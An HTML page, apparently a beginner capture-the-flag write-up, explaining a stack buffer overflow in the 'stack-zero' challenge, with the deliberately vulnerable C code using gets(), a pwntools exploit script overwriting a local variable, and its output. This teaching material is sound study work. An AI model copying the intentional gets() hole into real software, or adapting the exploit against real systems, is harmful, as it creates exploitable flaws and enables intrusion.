@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Researcher Pwn Challenge</title>
+    <link rel="stylesheet" href="1.css">
+</head>
+
+<body>
+    <div class="container">
+        <h1>Buffer Overflow: Exploiting</h1>
+
+        <p><strong>Author:</strong> <code>@untw0</code></p>
+        <p><strong>Date:</strong> <code>09/02/2025</code></p>
+
+        <h2>What is a Buffer Overflow?</h2>
+        <p>
+            A <code>buffer overflow</code> occurs when a program writes more data to a buffer than it can hold,
+            leading to unintended behavior such as memory corruption, crashes, or even arbitrary code execution.
+            This vulnerability is commonly exploited by attackers to manipulate program execution flow.
+        </p>
+        <p>
+            Se não entendeu muito bem, pense no seguinte, você tem um balde onde ele pode armazenar apenas 5 litros,
+            mas você resolve tentar colocar 6 litros nesse balde que só aguenta armazenar 5 litros, é óbvio que ele vai transbordar, 
+            então é básicamente assim que ocorre um Buffer Overflow.
+        </p>
+
+        <h2>Vulnerable Code: <code>stack-zero.c</code></h2>
+
+        <pre>
+<code>
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+#define BANNER "Challenge Completed"
+
+int main(int argc, char **argv) {
+    struct {
+        char buffer[64]; // Stores 64 bytes but lacks bounds checking
+        volatile int changeme; // Can be overwritten due to buffer overflow
+    } locals;
+
+    printf("%s\n", BANNER);
+
+    locals.changeme = 0;
+    gets(locals.buffer); // Dangerous function: allows buffer overflow
+
+    if (locals.changeme != 0) {
+        puts("Well done, the 'changeme' variable has been changed!");
+    } else {
+        puts("Uh oh, 'changeme' has not yet been changed. Would you like to try again?");
+    }
+
+    exit(0);
+}
+
+</code></pre>
+        
+        <h2>Why is this code vulnerable?</h2>
+        <p>
+            The function <code>gets()</code> does not check the size of the input, allowing an attacker to overwrite
+            adjacent memory, including the <code>changeme</code> variable. By sending a payload larger than 64 bytes,
+            an attacker can manipulate program behavior.
+        </p>
+
+        <h2>Crafting the Exploit</h2>
+        <p>Below is an exploit using <code>pwntools</code> to trigger the vulnerability:</p>
+
+        <pre>
+<code>
+from pwn import *  # Import pwntools for exploitation
+
+binary = './stack-zero'  # Path to the vulnerable binary
+elf = ELF(binary)
+    
+buffer = 64  # Size of the buffer
+padding = b'A' * buffer  # Filling the buffer
+value = p32(0xdeadbeef)  # Overwriting 'changeme' with target value
+    
+payload = padding + value
+    
+p = process(binary)  # Start the vulnerable process
+p.sendline(payload)  # Send exploit payload
+p.interactive()  # Get interactive shell
+
+</code></pre>
+
+        <h2>Final Result</h2>
+        <pre>
+<code>~# python3 exploit.py
+[*] '/exploit/stack-zero'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         Disabled (Executable Stack)
+    PIE:        No PIE (0x400000)
+    RWX:        Has RWX segments
+    Stripped:   No
+[+] Starting local process './stack-zero': pid 1510
+[*] Switching to interactive mode
+Challenge Completed
+Well done, the 'changeme' variable has been changed!
+[*] Got EOF while reading in interactive
+$</code></pre>
+</body>
+</html>
